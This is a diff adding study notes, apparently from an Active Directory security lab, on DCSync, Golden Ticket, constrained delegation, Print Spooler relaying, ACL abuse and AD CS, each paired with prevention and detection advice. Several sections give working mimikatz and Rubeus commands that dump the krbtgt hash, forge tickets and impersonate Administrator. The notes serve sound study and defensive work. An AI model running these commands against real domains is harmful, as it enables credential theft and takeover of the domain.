@@ -138,3 +138,188 @@ To prevent this, we should lock down file shares as much as possible. Additional
 
 Another detection technique is discovering the `one-to-many` connections, for example, when `Invoke-ShareFinder` scans every domain device to obtain a list of its network shares. It would be abnormal for a workstation to connect to 100s or even 1000s of other devices simultaneously.
 
+# Credentials in Object Properties
+
+Each object in AD contains properties, for ex: a `user` object may contain: 
+- Is the account active
+- When does the account expire
+- When was the last password change
+- What is the name of the account
+- Office location for the employee and phone number
+
+A common practice in the past was to add the user's (or service account's) password in the `Description` or `Info` properties, thinking that administrative rights in AD are needed to view these properties. However, `every` domain user can read most properties of an object making this a viable/simple attack method. You can use powershell to query this. 
+
+## Prevention and Detection
+The best way to prevent this is to create a baseline for user activity and find any anomalous actions. This can be tricky. Additionally, to prevent this behavior, a regular audit of object properties to ensure no credentials are stored is important. 
+
+# DCSync
+
+DCSync is an attack designed to impersonate a domain controller to extract password hashes from Active Directory. A user or computer just needs these two permissions: 
+- `Replicating Directory Changes`
+- `Replicating Directory Changes All`
+
+To run the attack: 
+- Start a command shell as someone with the privileges
+- Run mimikatz and specify the domain and user we want or we can specify all and get every hash. 
+	- It is possible to specify the `/all` parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform `pass-the-hash` with the obtained hash and authenticate against any Domain Controller.
+- Then we get the hash!
+```cmd-session
+Credentials:
+  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
+```
+
+
+## Prevention and Detection
+
+Domain replication is actually a really common activity that occurs between domain controllers. It is unfair to block it out of the bo0x, that would break AD. To prevent this type of attack we should utilize a RPC firewall designed to help us block any dcsync requests form uknown hosts or accounts. 
+
+Detecting DCSync is easy because each Domain Controller replication generates an event with the ID `4662`. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller.Because replications frequently occur, your detections should look for ther following properties: 
+- Either the property `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` is [present in the event](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb).
+- Whitelisting systems/accounts with a (valid) business reason for replicating, such as `Azure AD Connect` (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).
+
+# Golden Ticket
+The `Kerberos Golden Ticket` is an attack in which attackers can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.
+
+At the start of a domain, a unique user is created, `krbtgt`. It is a disabled user account that cannot be edited, deleted,  renamed, controlled.  The Domain Controller's KDC service will use the password of `krbtgt` to derive a key with which it signs all Kerberos tickets. This password's hash is the most trusted object in the entire Domain because it is how objects guarantee that the environment's Domain issued Kerberos tickets. 
+
+Therefore, `any user` possessing the password's hash of `krbtgt` can create valid Kerberos TGTs.
+
+## Attack
+
+To perform the `Golden Ticket` attack, we can use `Mimikatz` with the following arguments:
+
+- `/domain`: The domain's name.
+- `/sid`: The domain's SID value.
+- `/rc4`: The password's hash of `krbtgt`.
+- `/user`: The username for which `Mimikatz` will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)
+- `/id`: Relative ID (last part of `SID`) for the user for whom `Mimikatz` will issue the ticket.
+
+Additionally, advanced attackers mostly will specify values for the `/renewmax` and `/endin` arguments, as otherwise, `Mimikatz` will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:
+
+First we need to get the hash of the krbtgt user and the domain SID value. We can use the previous DCSync technique to get the hash. 
+
+```cmd-session
+mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
+```
+
+We will use the `Get-DomainSID` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to obtain the SID value of the Domain:
+
+```powershell-session
+PS C:\Users\bob\Downloads> . .\PowerView.ps1
+PS C:\Users\bob\Downloads> Get-DomainSID
+```
+
+Now, armed with all the required information, we can use `Mimikatz` to create a ticket for the account `Administrator`. The `/ptt` argument makes `Mimikatz` [pass the ticket into the current session](https://adsecurity.org/?page_id=1821#KERBEROSPTT):
+
+```cmd-session
+mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+```
+The output shows that `Mimikatz` injected the ticket in the current session, and we can verify that by running the command `klist` (after exiting from `Mimikatz`):
+
+## Detection and Prevention
+
+Preventing the creation of forged tickets is difficult as the `KDC` generates valid tickets using the same procedure. Therefore, once an attacker has all the required information, they can forge a ticket. Nonetheless, there are a few things we can and should do:
+- Block privileges users from authenticating to devices
+- Periodically reset the `krbtgt` account
+-  Enforce SIDHistory to prevent escalation from a child domain to a parent domain
+
+Establishing baselines for users is the best way to detect anomalies. For ex: looking at privledged accoutns and seeing one authenticate to a non-paw device is bad!!
+
+# Kerberos Constrained Delegation
+
+Kerberos delegation lets a trusted service **impersonate a user to another service without knowing the user’s password**.
+
+The simplest way to think about it:
+
+> Normal Kerberos: “I am bako. Let me access the web app.”  
+> Delegation: “The web app is allowed to use bako’s identity to access the database for him.”
+
+## Basic example
+
+You log into a company web app:
+
+```
+User → Web Server → SQL Server
+```
+
+The web server needs to query SQL for your data.
+
+Without delegation, SQL only sees:
+
+```
+WebServer$ is asking for data
+```
+
+With delegation, SQL can see:
+
+```
+bako is asking for data through WebServer$
+```
+
+So delegation lets the **middle service** pass your identity to the **backend service**.
+
+There are 3 type of delegations in AD: 
+- Unconstrained (Terrible)
+- Constrained
+- Resource-Based
+
+It is rare to see `Resource-based delegation` configured by an Administrator in production environments ( threat agents often abuse it to compromise devices). However, `Unconstrained` and `Constrained` delegations are commonly encountered in production environments.
+
+## Attack
+First create a NTLM hash for the compromised user account with the new password we have: 
+```powershell-session
+PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:Slavi123
+```
+
+Then use that to generate tickets for another account: 
+```powershell-session
+PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+```
+
+The /ptt argument injects the tickets into our session. Then we can do the final command to get to the dir that contains the flag. 
+```powershell-session
+Enter-PSSession dc1
+```
+
+
+
+
+# Printer Spooler & NTLM Relaying 
+
+
+1. Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
+2. Force the Domain Controller to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like `Rubeus` and `Mimikatz`.
+3. Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+4. Relay the connection to configure `Resource-Based Kerberos Delegation` for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
+We can do this by using imnpacket to relay the NTLM hash onwards. 
+
+To prevent this disabled the spool service on DC's using the registry editor. 
+
+# Object ACLs
+
+In AD, Object ACLs are tables or lists that define trustees who have access to a specific object and the level of access.
+
+To identify potential abusable ACLs, we will use [BloodHound](https://github.com/BloodHoundAD/BloodHound) to graph the relationships between the objects and [SharpHound](https://github.com/BloodHoundAD/SharpHound) to scan the environment and pass `All` to the `-c` parameter (short version of `CollectionMethod`):
+```powershell-session
+PS C:\Users\bob\Downloads> .\SharpHound.exe -c All
+```
+
+![[Pasted image 20260510204018.png]]
+Bob has full rights over the user Anni and the computer Server01. Below is what Bob can do with each of these:
+1. Case 1: Full rights over the user Anni. In this case, Bob can modify the object Anni by specifying some bonus SPN value and then perform the Kerberoast attack against it (if you recall, the success of this attack depends on the password's strength). However, Bob can also modify the password of the user Anni and then log in as that account, therefore, directly inheriting and being able to perform everything that Anni can (if Anni is a Domain admin, then Bob would have the same rights).
+2. 1. Case 2: Full control over a computer object can also be fruitful. If `LAPS` is used in the environment, then Bob can obtain the password stored in the attributes and authenticate as the local Administrator account to this server. Another escalation path is abusing `Resource-Based Kerberos Delegation`, allowing Bob to authenticate as anyone to this server. Recall that from the previous attack, Server01 is trusted for Unconstrained delegation, so if Bob was to get administrative rights on this server, he has a potential escalation path to compromise the identity of a Domain Controller or other sensitive computer object.
+
+# PKI 
+After `SpectreOps` released the research paper [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) became one of the most favorite attack vectors for threat agents due to many reasons, including:
+
+1. Using certificates for authentication has more advantages than regular username/password credentials.
+2. Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks discovered by SpectreOps (various researchers have discovered more attacks since then).
+
+There are a plethora of advantages to using certificates and compromising the `Certificate Authority` (`CA`):
+- Users and machines certificates are valid for 1+ years.
+- Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password; the certificate will still be valid (unless expired or revoked).
+- Misconfigured templates allow for obtaining a certificate for any user.
+- Compromising the CA's private key results in forging `Golden Certificates`.
+
+
+
